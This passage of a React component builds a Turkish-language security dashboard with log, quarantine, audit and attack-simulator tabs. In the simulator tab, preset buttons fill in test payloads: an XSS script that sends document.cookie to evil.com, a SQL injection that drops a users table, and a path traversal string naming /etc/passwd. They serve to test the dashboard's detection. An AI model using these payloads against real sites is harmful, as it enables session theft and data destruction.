                      borderRadius: '14px',
                      padding: '14px 18px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      flexWrap: 'wrap',
                      gap: '12px'
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
                      {getSeverityBadge(log.severity)}
                      <div>
                        <div style={{ color: '#fff', fontWeight: 700, fontSize: '0.9rem' }}>
                          {log.description}
                        </div>
                        <div style={{ color: '#64748b', fontSize: '0.78rem', marginTop: '2px', display: 'flex', gap: '12px' }}>
                          <span>📍 Kaynak: <b style={{ color: '#94a3b8' }}>{log.source}</b></span>
                          <span>🛡️ Aksiyon: <b style={{ color: '#10b981' }}>{log.action}</b></span>
                        </div>
                      </div>
                    </div>

                    <div style={{ color: '#64748b', fontSize: '0.78rem', display: 'flex', alignItems: 'center', gap: '6px' }}>
                      <Clock size={13} />
                      <span>{log.dateStr} {log.timeStr}</span>
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* TAB 2: QUARANTINE */}
        {activeTab === 'quarantine' && (
          <div style={{
            background: 'rgba(15, 23, 42, 0.7)',
            backdropFilter: 'blur(20px)',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            borderRadius: '24px',
            padding: '2rem'
          }}>
            <h3 style={{ margin: '0 0 1.5rem 0', fontSize: '1.2rem', fontWeight: 800 }}>🛡️ Aktif Karantina Kasası</h3>

            <form onSubmit={handleAddManualQuarantine} style={{
              background: 'rgba(255, 255, 255, 0.02)',
              border: '1px solid rgba(255, 255, 255, 0.08)',
              borderRadius: '16px',
              padding: '1.25rem',
              marginBottom: '2rem',
              display: 'flex',
              flexWrap: 'wrap',
              gap: '12px',
              alignItems: 'center'
            }}>
              <input
                type="text"
                placeholder="IP Adresi veya Kullanıcı (Örn: 85.105.xx.xx)"
                value={manualIp}
                onChange={(e) => setManualIp(e.target.value)}
                style={{
                  flex: 1,
                  minWidth: '220px',
                  background: 'rgba(15, 23, 42, 0.6)',
                  border: '1px solid rgba(255, 255, 255, 0.15)',
                  borderRadius: '10px',
                  padding: '10px 14px',
                  color: '#fff',
                  fontSize: '0.88rem',
                  outline: 'none'
                }}
              />
              <input
                type="text"
                placeholder="Engelleme Sebebi"
                value={manualReason}
                onChange={(e) => setManualReason(e.target.value)}
                style={{
                  flex: 1.5,
                  minWidth: '220px',
                  background: 'rgba(15, 23, 42, 0.6)',
                  border: '1px solid rgba(255, 255, 255, 0.15)',
                  borderRadius: '10px',
                  padding: '10px 14px',
                  color: '#fff',
                  fontSize: '0.88rem',
                  outline: 'none'
                }}
              />
              <button
                type="submit"
                style={{
                  background: 'linear-gradient(135deg, #f59e0b 0%, #d97706 100%)',
                  border: 'none',
                  color: '#fff',
                  fontWeight: 700,
                  padding: '10px 18px',
                  borderRadius: '10px',
                  fontSize: '0.85rem',
                  cursor: 'pointer'
                }}
              >
                + Karantinaya Ekle
              </button>
            </form>

            {quarantineList.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '3rem 1rem', color: '#64748b' }}>
                Karantinada olan hiçbir IP veya aktör bulunmuyor.
              </div>
            ) : (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
                {quarantineList.map((item) => (
                  <div
                    key={item.id}
                    style={{
                      background: 'rgba(245, 158, 11, 0.05)',
                      border: '1px solid rgba(245, 158, 11, 0.2)',
                      borderRadius: '14px',
                      padding: '14px 18px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      flexWrap: 'wrap',
                      gap: '12px'
                    }}
                  >
                    <div>
                      <div style={{ color: '#f59e0b', fontWeight: 800, fontSize: '0.95rem' }}>
                        🚫 {item.target}
                      </div>
                      <div style={{ color: '#94a3b8', fontSize: '0.8rem', marginTop: '2px' }}>
                        Sebep: {item.reason}
                      </div>
                    </div>

                    <button
                      onClick={() => handleRemoveQuarantine(item.target)}
                      style={{
                        background: 'rgba(239, 68, 68, 0.2)',
                        border: '1px solid rgba(239, 68, 68, 0.4)',
                        color: '#f87171',
                        padding: '6px 12px',
                        borderRadius: '8px',
                        fontSize: '0.78rem',
                        fontWeight: 700,
                        cursor: 'pointer'
                      }}
                    >
                      Karantinadan Çıkar
                    </button>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* TAB 3: AUDIT */}
        {activeTab === 'audit' && (
          <div style={{
            background: 'rgba(15, 23, 42, 0.7)',
            backdropFilter: 'blur(20px)',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            borderRadius: '24px',
            padding: '2rem'
          }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '1.5rem', flexWrap: 'wrap', gap: '12px' }}>
              <div>
                <h3 style={{ margin: 0, fontSize: '1.2rem', fontWeight: 800 }}>🔍 Otonom Sistem Teşhisi & Bütünlük Raporu</h3>
                <p style={{ margin: '4px 0 0 0', color: '#94a3b8', fontSize: '0.82rem' }}>Tüm savunma hatlarının anlık sağlık kontrolü</p>
              </div>

              <button
                onClick={handleRunAudit}
                disabled={isAuditing}
                style={{
                  background: 'linear-gradient(135deg, #3b82f6 0%, #1d4ed8 100%)',
                  color: '#fff',
                  border: 'none',
                  padding: '10px 18px',
                  borderRadius: '12px',
                  fontWeight: 700,
                  fontSize: '0.85rem',
                  cursor: isAuditing ? 'not-allowed' : 'pointer',
                  display: 'flex',
                  alignItems: 'center',
                  gap: '8px'
                }}
              >
                <RefreshCw size={16} style={{ animation: isAuditing ? 'spin 1s linear infinite' : 'none' }} />
                <span>{isAuditing ? 'Taranıyor...' : 'Yeni Tarama Başlat'}</span>
              </button>
            </div>

            {auditResult && (
              <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
                {auditResult.checks.map((c, i) => (
                  <div
                    key={i}
                    style={{
                      background: 'rgba(255, 255, 255, 0.03)',
                      border: '1px solid rgba(16, 185, 129, 0.2)',
                      borderRadius: '14px',
                      padding: '16px 20px',
                      display: 'flex',
                      alignItems: 'center',
                      justifyContent: 'space-between',
                      flexWrap: 'wrap',
                      gap: '12px'
                    }}
                  >
                    <div style={{ display: 'flex', alignItems: 'center', gap: '14px' }}>
                      <CheckCircle2 size={22} style={{ color: '#10b981', flexShrink: 0 }} />
                      <div>
                        <div style={{ color: '#fff', fontWeight: 700, fontSize: '0.92rem' }}>
                          {c.name}
                        </div>
                        <div style={{ color: '#94a3b8', fontSize: '0.8rem', marginTop: '2px' }}>
                          {c.details}
                        </div>
                      </div>
                    </div>

                    <span style={{
                      background: 'rgba(16, 185, 129, 0.15)',
                      color: '#10b981',
                      border: '1px solid rgba(16, 185, 129, 0.3)',
                      padding: '4px 10px',
                      borderRadius: '8px',
                      fontWeight: 800,
                      fontSize: '0.75rem'
                    }}>
                      %100 GÜVENLİ
                    </span>
                  </div>
                ))}
              </div>
            )}
          </div>
        )}

        {/* TAB 4: SIMULATOR */}
        {activeTab === 'simulator' && (
          <div style={{
            background: 'rgba(15, 23, 42, 0.7)',
            backdropFilter: 'blur(20px)',
            border: '1px solid rgba(255, 255, 255, 0.1)',
            borderRadius: '24px',
            padding: '2rem'
          }}>
            <h3 style={{ margin: '0 0 0.5rem 0', fontSize: '1.2rem', fontWeight: 800 }}>⚡ Sentinel Savunma Simülatörü</h3>
            <p style={{ color: '#94a3b8', fontSize: '0.85rem', marginBottom: '1.5rem' }}>
              Sisteme yapay bir saldırı veya zararlı payload göndererek Sentinel antikor motorunun nasıl anında reaksiyon verdiğini test edin.
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '14px', marginBottom: '1.5rem' }}>
              <label style={{ color: '#cbd5e1', fontSize: '0.82rem', fontWeight: 600 }}>Test Payload Metni:</label>
              <textarea
                rows={3}
                value={testPayload}
                onChange={(e) => setTestPayload(e.target.value)}
                style={{
                  width: '100%',
                  background: 'rgba(15, 23, 42, 0.6)',
                  border: '1px solid rgba(255, 255, 255, 0.15)',
                  borderRadius: '12px',
                  padding: '12px',
                  color: '#fff',
                  fontFamily: 'monospace',
                  fontSize: '0.9rem',
                  outline: 'none',
                  boxSizing: 'border-box'
                }}
              />
            </div>

            <div style={{ display: 'flex', gap: '10px', flexWrap: 'wrap', marginBottom: '1.5rem' }}>
              <button
                type="button"
                onClick={() => setTestPayload("<script>fetch('http://evil.com?c='+document.cookie)</script>")}
                style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#cbd5e1', padding: '6px 12px', borderRadius: '8px', fontSize: '0.75rem', cursor: 'pointer' }}
              >
                XSS Örneği
              </button>
              <button
                type="button"
                onClick={() => setTestPayload("' OR 1=1; DROP TABLE users; --")}
                style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#cbd5e1', padding: '6px 12px', borderRadius: '8px', fontSize: '0.75rem', cursor: 'pointer' }}
              >
                SQLi Örneği
              </button>
              <button
                type="button"
                onClick={() => setTestPayload("/etc/passwd ../../windows/system32")}
                style={{ background: 'rgba(255,255,255,0.05)', border: '1px solid rgba(255,255,255,0.1)', color: '#cbd5e1', padding: '6px 12px', borderRadius: '8px', fontSize: '0.75rem', cursor: 'pointer' }}
              >
                Path Traversal
              </button>
            </div>

            <button
              onClick={handleSimulateAttack}
              style={{
                background: 'linear-gradient(135deg, #a855f7 0%, #7c3aed 100%)',
                color: '#fff',
                border: 'none',
                padding: '12px 24px',
                borderRadius: '12px',
                fontWeight: 700,
                fontSize: '0.9rem',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                gap: '8px',
                boxShadow: '0 8px 20px rgba(168, 85, 247, 0.3)'
              }}
            >
              <Zap size={18} />
              <span>Simülasyonu Çalıştır</span>
            </button>

            {simResult && (
              <div style={{
                marginTop: '1.5rem',
                background: simResult.isThreat ? 'rgba(239, 68, 68, 0.1)' : 'rgba(16, 185, 129, 0.1)',
                border: simResult.isThreat ? '1px solid rgba(239, 68, 68, 0.3)' : '1px solid rgba(16, 185, 129, 0.3)',
                borderRadius: '16px',
                padding: '1.25rem'
              }}>
                <h4 style={{ margin: '0 0 8px 0', color: simResult.isThreat ? '#f87171' : '#34d399', fontSize: '1rem', fontWeight: 800 }}>
                  {simResult.isThreat ? '🚨 TEHDİT YAKALANDI & NÖTRALİZE EDİLDİ!' : '✅ TEMİZ VERİ'}
                </h4>
                <div style={{ color: '#cbd5e1', fontSize: '0.85rem' }}>
                  <b>Tehdit Skoru:</b> {simResult.score} / 100
                </div>
                {simResult.matches && simResult.matches.length > 0 && (
                  <div style={{ marginTop: '8px', color: '#fca5a5', fontSize: '0.8rem' }}>
                    <b>Eşleşen Kural:</b> {simResult.matches.map(m => m.desc).join(', ')}
                  </div>
                )}
              </div>
            )}
          </div>
        )}
      </div>
    </div>
  );
}
